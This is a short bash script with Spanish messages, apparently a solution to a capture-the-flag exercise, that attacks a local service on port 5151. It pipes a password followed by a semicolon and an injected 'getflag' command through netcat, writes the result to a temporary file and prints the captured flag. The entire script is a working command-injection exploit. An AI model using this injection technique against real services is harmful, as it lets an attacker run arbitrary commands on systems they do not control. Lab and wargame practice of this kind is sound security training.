#!/bin/bash

OUTPUT="/tmp/jeje"
rm -f $OUTPUT

echo "[+] Conectando al servicio en el puerto 5151..."

echo "contraseña; getflag > $OUTPUT" | nc 127.0.0.1 5151

sleep 1

if [ -f "$OUTPUT" ]; then
    echo "[+] ¡Éxito! Flag encontrada:"
    cat $OUTPUT
    rm -f $OUTPUT
else
    echo "[-] Error: No se pudo obtener la flag. Revisa si el servicio está corriendo."
fi